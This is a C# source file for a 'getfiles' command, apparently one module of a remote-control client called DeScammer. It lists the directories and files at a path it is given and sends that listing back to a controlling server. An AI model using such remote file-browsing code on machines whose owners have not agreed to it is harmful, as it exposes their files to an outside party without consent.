using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using DeScammer.API;

namespace DeScammer.Commands
{
    [Command("getfiles", 1)]
    public class GetFiles : Command
    {
        public override void Execute(string[] args)
        {
            string path = args[0];
            List<string> f = new List<string>();

            if(path.Substring(path.Length - 3, 2) == "..")
                path = GoBack(path); // Get the previous path

            f.Add(path); // Add the path
            f.Add("\\.."); // Add the back
            foreach(string dir in Directory.GetDirectories(path))
                if(!f.Contains("\\" + Path.GetFileName(dir)))
                    f.Add("\\" + Path.GetFileName(dir)); // Add the directories
            foreach (string file in Directory.GetFiles(path))
                if(!f.Contains(Path.GetFileName(file)))
                    f.Add(Path.GetFileName(file)); // Add the files

            Variables.Server.Send(CommandManager.FormatCommand("listfiles", f.ToArray())); // Send the info
        }

        private string GoBack(string path)
        {
            string[] p = path.Substring(0, path.Length - 3).Split('\\');
            string ret = "";

            for(int i = 0; i < (p.Length - 1); i++)
                ret += p[i] + "\\";

            return ret.Substring(0, ret.Length - 1);
        }
    }
}
